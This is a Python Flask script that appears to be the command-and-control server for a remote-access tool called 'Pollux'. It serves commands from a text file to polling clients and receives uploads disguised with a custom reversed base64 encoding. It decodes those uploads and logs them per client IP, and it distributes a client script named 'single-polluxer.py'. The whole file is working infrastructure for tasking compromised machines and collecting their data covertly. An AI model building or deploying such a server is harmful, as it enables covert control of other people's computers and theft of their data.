#!/usr/bin/env python3

from json import loads,dumps
dumper=dumps
loader=loads
from base64 import b64decode,b64encode
def encoder(string): return b64encode(string).replace(b'=',b'.').replace(b'+',b'-').replace(b'/',b'_')[::-1]
def decoder(string): return b64decode( string[::-1].replace(b'.',b'=').replace(b'-',b'+').replace(b'_',b'/') )
matchMark=b'lS6c2aT'


from time import time
import re,os
pattern=re.escape(matchMark)+rb'(.*?)'+re.escape(matchMark[::-1])
from flask import Flask,request,send_file
cpp=Flask(__name__)



def deMsg(recv):
    '''return list object'''
    if isinstance(recv,str):
        recv=recv.encode()
    matches=re.findall(pattern,recv)
    if matches:
        result=decoder(matches[0])
    else:
        result=decoder(recv)
    result=loader(result)
    return result


cmdCache=''
timeCache=0
def get_cmd_content():
    global cmdCache,timeCache
    try:
        current_time=time()
        if cmdCache=='' or current_time-timeCache > 10:
            with open('copy-cmd.txt','r',encoding='utf-8') as f:
                cmdCache=f.read()
            timeCache=current_time
    except Exception as e:
        print(f"Error reading file: {str(e)}")
    return cmdCache


@cpp.route('/getcmd',methods=['GET'])
def get_cmd():
    client_ip=request.remote_addr
    user_agent=request.headers.get('User-Agent','Unknown')
    cmd_content=get_cmd_content()

    with open('getcmd.log','a',encoding='utf-8') as f:
        f.write(f"{int(time())} {client_ip} {user_agent}\n")
    return cmd_content,200


logPath='hook-logs'
if not os.path.exists(logPath):
    os.makedirs(logPath)
@cpp.route('/webhook',methods=['POST'])
def webhook():
    data=request.get_data(as_text=True)
    client_ip=request.remote_addr
    user_agent=request.headers.get('User-Agent','Unknown')

    ip_log_file=os.path.join(logPath,f'{client_ip}.log')

    if data:
        try:
            decoded=deMsg(data)
            with open(ip_log_file,'a',encoding='utf-8') as f:
                f.write(f"\n=== Webhook Received ===\n")
                f.write(f"Time: {time()}\n")
                f.write(f"Client IP: {client_ip}\n")
                f.write(f"User-Agent: {user_agent}\n")
                f.write(f"Raw Data: {data}\n")
                f.write(f"Decoded Result:\n{dumps(decoded,indent=2,ensure_ascii=False)}\n")
        except Exception as e:
            with open(ip_log_file,'a',encoding='utf-8') as f:
                f.write(f"\n=== Webhook Error ===\n")
                f.write(f"Time: {time()}\n")
                f.write(f"Client IP: {client_ip}\n")
                f.write(f"User-Agent: {user_agent}\n")
                f.write(f"Raw Data: {data}\n")
                f.write(f"Error: {str(e)}\n")
    return 'Pollux'+str(time())[-2:],200


@cpp.route('/download')
def download_client():
    try:
        return send_file('single-polluxer.py',as_attachment=True)
    except FileNotFoundError:
        return 404




if __name__=='__main__':
    cpp.run(host='0.0.0.0',port=5201)
    #cpp.run(host='127.0.0.1',port=5201,debug=True)





